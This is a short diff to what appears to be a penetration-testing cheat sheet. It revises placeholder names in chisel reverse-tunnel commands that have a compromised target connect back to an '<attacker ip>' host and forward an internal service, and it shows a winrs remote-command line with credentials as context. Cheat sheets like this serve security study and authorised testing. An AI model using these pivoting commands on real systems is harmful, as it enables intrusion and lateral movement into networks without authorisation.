@@ -655,7 +655,7 @@ winrs -R:<host> -u:<username> -p:<password> cmd
 attacker
 
 ```shell
-./chisel server -p <port> --reverse -v
+./chisel server -p <attacker port> --reverse -v
 ```
 
 target
@@ -669,7 +669,7 @@ Windows
 Linux
 
 ```shell
-./chisel client <attacker ip>:<attacker port> R:<target service port>:localhost:<target service port>
+./chisel client <attacker ip>:<attacker port> R:<attacker proxy port>:localhost:<target service port>
 ```
 
 using proxychains 
